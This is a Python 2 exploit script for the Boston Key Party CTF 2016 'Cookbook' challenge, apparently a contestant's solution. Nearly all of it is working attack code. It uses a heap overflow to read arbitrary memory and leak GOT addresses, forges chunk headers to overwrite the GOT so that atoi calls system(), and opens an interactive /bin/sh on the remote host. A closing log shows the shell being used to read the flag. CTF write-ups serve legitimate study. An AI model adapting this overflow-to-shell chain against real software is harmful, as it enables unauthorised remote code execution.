#!/usr/bin/env python2
# --------------------------------------------------------------------------------------------------
# BostonKeyParty CTF 2016 - Cookbook (Pwn 6pt)
# --------------------------------------------------------------------------------------------------
import struct
import sys
import socket
import struct
import telnetlib

# --------------------------------------------------------------------------------------------------
def recv_until(st):                         # receive until you encounter a string
  ret = ""
  while st not in ret:
    ret += s.recv(16384)

  return ret

# --------------------------------------------------------------------------------------------------
def S( r, c ):                              # receive and send something 
    ans = ''
    if r != '': ans = recv_until(r) 
    s.send( c + '\n' )

    print '----------------------------------------------------------------'
    print 'Received:\n', ans
    print 'Sending: ', c

    return ans
        
# --------------------------------------------------------------------------------------------------
def arbitrary_read(addr):                   # read 4 bytes from an arbitrary address
 
    S('[q]uit', 'c')                        # create a new recipe
    S('[q]uit', 'n')                        # allocate memory for recipe
    
    S('[q]uit', 'a')                        # add a tomato ingredient
    S('add?'  , 'tomato')   
    S('(hex):', '1')

    S('[q]uit', 'a')                        # add water as ingredient
    S('add?'  , 'water')    
    S('(hex):', '1')

    S('[q]uit', 'g')                        # set recipe name
    
    p  = 'A'*(1036-140-4)                   # fill recipe buffer
    p += 'B'*8                              # fill chunk header (ingredient)
    p += struct.pack('<L', addr)            # that address that you want to read
    p += struct.pack('<L', 0x00000000)      # *next must be NULL

    p += 'C'*8                              # fill chunk header (quantity)
    p += struct.pack('<L', 0x00000001)      # quantity must be 1
    p += struct.pack('<L', 0x00000000)      # *next is NULL

    S('', p)                                # send name
    S('[q]uit', 'p')                        # print recipe

    r = S('[q]uit', 'q')                    # go back
    r = r[r.find('total cals : ') + len('total cals : '):]
    r = r[:r.find('\n')]                    # read number after "total cals :"
    r = r.rstrip()

    return int(r)                           # return address

# --------------------------------------------------------------------------------------------------
if __name__ == "__main__":
    
    s = socket.create_connection(('cookbook.bostonkey.party', 5000))  # connect to server
    #s = socket.create_connection(('localhost', 7777))  # connect to server
    
    S('name?', 'ispo_1234567890')           # set fairly big name


    ''' =======================================================================
        leak some addresses that you'll need
    ======================================================================= '''
    strcspn = arbitrary_read( 0x0804D014 )  # leak some address from .got
    free    = arbitrary_read( 0x0804D018 )
    fgets   = arbitrary_read( 0x0804D020 )
    puts    = arbitrary_read( 0x0804D030 )  
    atoi    = arbitrary_read( 0x0804D044 )
    calloc  = arbitrary_read( 0x0804D048 )

    name    = arbitrary_read( 0x0804D0AC )  # address of chef's name

    # offsets in libc of the remote host
    #   fgets  : 0x60eb0
    #   free   : 0x73880    (free needs to be fixed too)
    #   system : 0x3b160
    free    = fgets + (0x73880 - 0x60eb0)
    atoi    = fgets - (0x60eb0 - 0x3b160)

    ''' Local addresses on my machine:

        strcspn = 0xF7F44DA0
        free    = 0xF7E7B070
        fgets   = 0xF7E68220
        puts    = 0xF7E69D00
        atoi    = 0xf7e43360
        calloc  = 0xF7E7B3D0
    '''
    # local offsets in my libc (add some offsets to fix them)
    #   fgets  : 0x63320
    #   free   : 0x757d0    (free needs to be fixed too)
    #   system : 0x39ea0
    
    # free    = fgets + (0x757d0 - 0x63320) + 0x9a0
    # atoi    = fgets - (0x63320 - 0x39ea0) + 0x45C0 

    print ' *** Leaking addresses *** '
    print 'strcspn', strcspn, hex(strcspn) 
    print 'free   ', free,    hex(free) 
    print 'fgets  ', fgets,   hex(fgets) 
    print 'puts   ', puts,    hex(puts) 
    print 'atoi   ', atoi,    hex(atoi) 
    print 'calloc ', calloc,  hex(calloc) 

    print 'name ',   calloc,  hex(name) 

    # exit(0)

    ''' =======================================================================
        Now, make TEMP_INGR pointing to .got - 8
    ======================================================================= '''
    n = (1036+ 8+8)                         # recipe size + list elt size + slab metadata   
    S('[q]uit'    , 'g')                    # name cookbook
    S('hacker!) :', '%x' % n)               # set size
    S(''          , 'F'*(n-2))              # write something dummy
    
    S('[q]uit', 'a')                        # add a new ingredient
    S('quit)?', 'n')                        # allocate memory for it after cookbook name
    S('quit)?', 'g')                        # give a dummy name
    S(''      , 'kyriakos')                 # 
    S('quit)?', 'q')                        # go back

    S('[q]uit', 'R')                        # remove cookbook name, so the region above the
                                            #  new ingredient is free
    S('[q]uit', 'c')                        # create a recipe
    S('[q]uit', 'n')                        # allocate memory before new ingredient
    S('[q]uit', 'a')                        # add an ingredient (after recipe object)
    S('add?'  , 'olive oil')                #
    S('(hex):', '1337')                     #
    
    S('[q]uit', 'g')                        # name recipe (overflow)

    p  = 'A'*(1036-140-4)                   # fill recipe buffer
    p += 'B'*8                              #  and chunk header
    p += struct.pack('<L', 0x41414141)      # we don't care about this pointer
    p += struct.pack('<L', 0x0804D094)      # address of ingr_list
    S('', p)                                # send payload


    S('[q]uit', 'a')                        # add 1 more  ingredient
    S('add?'  , 'olive oil')                # the address of it will be stored on X
    S('(hex):', '1337')                     #  X is not NULL anymore -> don't crash
    
    S('[q]uit', 'g')                        # overflow for 2nd time

    p  = 'A'*(1036-140-4)                   # fill recipe buffer
    p += '\x00'*7 + '\x11'                  # forge a fake chunk header
    p += struct.pack('<L', 0x0804A83F-8)    # 8 bytes before "saved!"
    p += struct.pack('<L', 0x0804D098)      # address of X (X = NULL)
    p += '\x00'*4 + '\x99'+ '\x00'*3        # forge a fake chunk header
    p += struct.pack('<L', name)            # point to chef's name
    p += struct.pack('<L', 0x0804CFF8)      # 8 bytes before .got
    p += '\x00'*7 + '\x11'                  # forge a fake chunk header

    S('', p)                                # send payload
    S('[q]uit' , 'r')                       # remove an ingredient
    S('remove?', '4567890\x00')             # 8 bytes after chef's name
    S('[q]uit' , 'q')                       # go back
    ''' =======================================================================
        X+4 = TEMP_INGR and TEMP_INGR points to .got - 8
        Now overwrite the required entries
    ======================================================================= '''
    S('[q]uit'      , 'e')                  # remove something to make space
    S('exterminate?', 'lemon\x00')          #   at low addresses of the heap (optional)
    S('[q]uit'      , 'e')                  #
    S('exterminate?', 'lemon\x00')          #

    S('[q]uit', 'a')                        # add a new ingredient (don't allocate memory for it)
    S('quit)?', 'g')                        # set it's name

    p  = 'A'*12                             # fill first 12 bytes of .got (dummy)
    p += struct.pack('<L', 0)               # reconstruct .got
    p += struct.pack('<L', 0)               #
    p += struct.pack('<L', strcspn)         # strcspn
    p += struct.pack('<L', free)            # free
    p += struct.pack('<L', 0)               #
    p += struct.pack('<L', fgets)           # fgets
    p += struct.pack('<L', 0)               #
    p += struct.pack('<L', 0)               #
    p += struct.pack('<L', 0)               #
    p += struct.pack('<L', puts)            # puts
    p += struct.pack('<L', 0)               #
    p += struct.pack('<L', 0)               #
    p += struct.pack('<L', 0)               #
    p += struct.pack('<L', 0)               #
    p += struct.pack('<L', atoi)            # atoi
    p += struct.pack('<L', calloc)          # calloc
    S('', p)                                # send payload

    ''' ======================================================================= 
        address of atoi() is overwritten with system(). Trigger atoi() 
        and open shell
    ======================================================================= '''
    S('quit)?', 's')                        # set "calories"
    S('', '/bin/sh')                        # send argument

    print ' *** Opening Shell *** '
    t = telnetlib.Telnet()                  # try to open shell
    t.sock = s
    t.interact()
    
# --------------------------------------------------------------------------------------------------
'''
root@nogirl:~/ctf/bostonkeyparty# ./cookbook_expl.py 
    [..... TRUNCATED FOR BREVITY .....]
    ----------------------------------------------------------------
    Received:

    Sending:  /bin/sh
     *** Opening Shell *** 
    whoami
        nobody
    ls -la
        total 1816
        drwxr-xr-x 2 cooking-manager cooking-manager    4096 Mar  5 01:38 .
        drwxr-xr-x 3 root            root               4096 Mar  4 03:51 ..
        -rw-r--r-- 1 cooking-manager cooking-manager     220 Mar  4 03:51 .bash_logout
        -rw-r--r-- 1 cooking-manager cooking-manager    3771 Mar  4 03:51 .bashrc
        -rw-r--r-- 1 cooking-manager cooking-manager     675 Mar  4 03:51 .profile
        -rwxr-xr-x 1 root            root              17936 Mar  4 04:05 cookbook
        -rw-r--r-- 1 root            root                 38 Mar  5 01:38 key
        -rwxrwxr-x 1 cooking-manager cooking-manager 1807496 Mar  4 04:10 libc.so.6
        -rwxr-xr-x 1 root            root                136 Mar  4 23:46 run.sh
    cat key
        BKPCTF{hey_my_grill_doesnt_work_here}
    cat run.sh
        #!/bin/bash
        socat TCP-LISTEN:5000,fork,reuseaddr,su=nobody SYSTEM:"timeout 60 LD_PRELOAD=/home/cooking-manager/libc.so.6 ./cookbook $1"
    exit
    *** Connection closed by remote host ***
'''
# --------------------------------------------------------------------------------------------------
